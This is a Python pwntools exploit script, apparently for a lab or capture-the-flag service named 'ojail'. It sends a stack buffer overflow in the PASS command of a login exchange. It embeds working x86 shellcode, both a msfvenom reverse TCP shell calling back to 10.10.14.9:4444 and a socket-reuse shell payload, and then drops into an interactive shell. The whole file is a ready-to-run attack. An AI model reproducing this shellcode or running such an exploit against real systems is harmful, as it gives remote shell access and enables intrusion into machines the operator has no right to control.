#!/usr/bin/python

# author: WatchDogOblivion
# description: TODO
# WatchDogs Overflow Jail a.k.a ojail

from pwnlib.context import context
from pwnlib.util.packing import pack
from pwnlib.tubes.remote import remote

from watchdogs.base.models import AllArgs
from watchdogs.pwn.parsers import OverflowArgs
from watchdogs.utils.PwnUtility import p32

# Check bad chars with x/100x $sp-200 in gdb against watchdogs.utils.Constants.ORIGINAL_BAD_CHARS as the payload
BAD_CHARS = ("\x00\x0a\x0b\x0c\xf3\xf4")

########## Working X86 payloads Start ##########

# Reverse TCP
# msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -b '\x00\x0a\x0b\x0c\xf3\xf4' -f python --smallest
RTCP_PAYLOAD = b""
RTCP_PAYLOAD += b"\xeb\x23\x5b\x89\xdf\xb0\x66\xfc\xae\x75\xfd\x89\xf9"
RTCP_PAYLOAD += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xd8\x05\x74"
RTCP_PAYLOAD += b"\x08\x46\x80\x3e\x66\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
RTCP_PAYLOAD += b"\xff\xff\xff\x13\x66\x22\xc8\xe4\xf0\x40\x50\x40\x79"
RTCP_PAYLOAD += b"\x11\x9a\xf2\xa3\x75\xde\x93\x80\x4a\xa3\x2c\xde\x93"
RTCP_PAYLOAD += b"\x5a\x6a\xea\x7b\x19\x19\x1d\x1a\x7b\x11\x13\x02\x4f"
RTCP_PAYLOAD += b"\x9a\xf2\xa3\x75\x43\x42\x40\xa0\x10\x9a\xf2\xde\x93"
RTCP_PAYLOAD += b"\x41\x7b\x7d\x3c\x60\x7b\x7b\x3c\x3c\x71\x7a\x9a\xf0"
RTCP_PAYLOAD += b"\x41\x40\x9a\xf2\xa3\x18\xde\x93\xd8\x05"

# Socket Reuse
# https://www.exploit-db.com/exploits/34060
SOCKET_REUSE = b""
SOCKET_REUSE += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
SOCKET_REUSE += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
SOCKET_REUSE += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
SOCKET_REUSE += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
SOCKET_REUSE += b"\x89\xe3\x31\xc9\xcd\x80"

########## Working X86 payloads End ##########


def __main__():  #type: () -> None
  allArgs = AllArgs([OverflowArgs()]).mergeAndProcess()
  oArgs = allArgs.getArgs(OverflowArgs)
  context(os=oArgs.operatingSystem, arch=oArgs.arch)  # Context not needed just good for info and stability

  buffer = oArgs.bufferCharacter * oArgs.bufferSize
  basePointer = oArgs.basePointer
  offset = len(buffer) + len(basePointer) + oArgs.archBytes
  instructionPointer = p32(int(oArgs.memoryAddress, 16) + offset)
  payload = SOCKET_REUSE

  p = remote(oArgs.remoteHost, oArgs.remotePort)
  p.recvuntil("OK Ready. Send USER command.")
  p.sendline("DEBUG")
  p.recvuntil("OK DEBUG mode on.")
  p.sendline("USER admin")
  p.recvuntil("OK Send PASS command.")
  p.sendline("PASS " + buffer + basePointer + instructionPointer + payload)
  p.interactive()


__main__()